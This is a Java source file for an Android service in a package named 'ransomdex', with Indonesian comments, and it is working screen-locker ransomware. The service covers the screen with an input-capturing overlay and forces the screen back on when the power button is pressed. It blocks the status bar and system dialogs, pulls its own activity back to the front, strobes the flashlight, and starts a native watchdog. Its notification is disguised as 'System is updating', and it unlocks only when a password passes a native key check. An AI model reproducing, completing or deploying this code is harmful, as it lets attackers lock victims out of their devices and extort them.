package com.bondex.ransomdex;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraManager;
import android.os.IBinder;
import android.os.Build;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.os.Handler;
import java.lang.reflect.Method;
import android.widget.Button;
import android.widget.EditText;

public class LockerService extends Service {
    private WindowManager windowManager;
    private View lockerLayout;
    private CameraManager cameraManager;
    private String cameraId;
    private boolean isFlashOn = false;

    static {
        System.loadLibrary("ransom-native");
    }

    public native void startNativeAggression(String serviceName);
    public native void stopNativeAggression();
    public native boolean verifyAdvancedKey(String input);

    private Handler flashHandler = new Handler();
    private Runnable flashRunnable = new Runnable() {
        @Override
        public void run() {
            toggleFlashlight(!isFlashOn);
            flashHandler.postDelayed(this, 50); // Kedip setiap 50ms
        }
    };

    private BroadcastReceiver screenReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(Intent.ACTION_SCREEN_OFF)) {
                // Jika user menekan tombol power (layar mati), paksa nyalakan lagi
                PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
                PowerManager.WakeLock wakeLock = pm.newWakeLock(PowerManager.FULL_WAKE_LOCK | PowerManager.ACQUIRE_CAUSES_WAKEUP, "RansomDex:WakeLock");
                wakeLock.acquire(1000);
            }
        }
    };

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // Trik untuk memblokir Quick Settings/Notifikasi
    private void collapseStatusBar() {
        try {
            Object statusBarService = getSystemService("statusbar");
            Class<?> statusBarManager = Class.forName("android.app.StatusBarManager");
            Method collapse = statusBarManager.getMethod("collapsePanels");
            collapse.setAccessible(true);
            collapse.invoke(statusBarService);
        } catch (Exception e) {
            // Device mungkin butuh penanganan berbeda tergantung versi Android
        }
    }

    // Memaksa MainActivity kembali ke depan jika user berhasil lari ke Settings
    public void forceFront() {
        Intent i = new Intent(this, MainActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | 
                   Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | 
                   Intent.FLAG_ACTIVITY_SINGLE_TOP |
                   Intent.FLAG_ACTIVITY_NO_ANIMATION);
        startActivity(i);
    }

    // Menutup menu power, notifikasi, dan dialog sistem lainnya secara instan
    private void closeSystemDialogs() {
        try {
            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
            sendBroadcast(closeDialog);
        } catch (Exception e) {
        }
    }

    private void toggleFlashlight(boolean status) {
        try {
            if (cameraId != null) {
                cameraManager.setTorchMode(cameraId, status);
                isFlashOn = status;
            }
        } catch (Exception e) {}
    }

    private void applyFullScreen() {
        if (lockerLayout == null) return;
        lockerLayout.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY |
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE |
                View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN |
                View.SYSTEM_UI_FLAG_HIDE_NAVIGATION |
                View.SYSTEM_UI_FLAG_FULLSCREEN
        );
    }

    @Override
    public void onCreate() {
        super.onCreate();

        startInForeground();

        // Inisialisasi Kamera untuk Senter
        cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
        try {
            String[] ids = cameraManager.getCameraIdList();
            if (ids.length > 0) cameraId = ids[0];
        } catch (Exception e) {}

        // Register receiver untuk deteksi tombol power (layar mati)
        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(screenReceiver, filter, Context.RECEIVER_EXPORTED);
        } else {
            registerReceiver(screenReceiver, filter);
        }

        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        lockerLayout = LayoutInflater.from(this).inflate(R.layout.locker_layout, null);

        lockerLayout.setFitsSystemWindows(false);
        // Memastikan background layout menutupi seluruh layar dan menangkap touch
        lockerLayout.setBackgroundColor(0xFF000000); 

        applyFullScreen();

        // FLAG_NOT_FOCUSABLE DIHAPUS agar overlay menangkap semua input (Back/Home)
        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS |
                WindowManager.LayoutParams.FLAG_FULLSCREEN |
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
                WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.OPAQUE); // Menggunakan Opaque agar status bar hitam pekat

        // Mengatasi notch/poni agar status bar benar-benar hitam pekat di HP modern
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }
        
        // Memastikan overlay dapat menerima input keyboard untuk password
        params.flags &= ~WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE;

        params.gravity = Gravity.CENTER;
        windowManager.addView(lockerLayout, params);

        // Jalankan mesin C++ yang lebih ganas
        startNativeAggression(getPackageName() + "/.LockerService");
        flashHandler.post(flashRunnable);

        Button btnUnlock = lockerLayout.findViewById(R.id.btnUnlock);
        EditText inputPass = lockerLayout.findViewById(R.id.editPassword);

        btnUnlock.setOnClickListener(v -> {
            // Menggunakan Enkripsi Militer Native Check
            if (verifyAdvancedKey(inputPass.getText().toString().trim())) {
                // Simpan status unlock agar tidak dikunci lagi oleh MainActivity/Boot
                getSharedPreferences("RansomPrefs", MODE_PRIVATE).edit().putBoolean("unlocked", true).apply();
                
                stopNativeAggression(); // Pastikan watchdog mati duluan
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                    stopForeground(STOP_FOREGROUND_REMOVE);
                }
                stopSelf();
                android.os.Process.killProcess(android.os.Process.myPid()); // Force kill aplikasi
            }
        });
    }

    private void startInForeground() {
        String CHANNEL_ID = "locker_service_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "System Update",
                    NotificationManager.IMPORTANCE_LOW);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) manager.createNotificationChannel(channel);
        }

        Notification notification = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("System is updating")
                    .setSmallIcon(android.R.drawable.stat_notify_sync)
                    .build();
        }
        startForeground(1, notification);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        stopNativeAggression();
        flashHandler.removeCallbacks(flashRunnable);
        toggleFlashlight(false);
        unregisterReceiver(screenReceiver);
        if (lockerLayout != null) windowManager.removeView(lockerLayout);
    }
}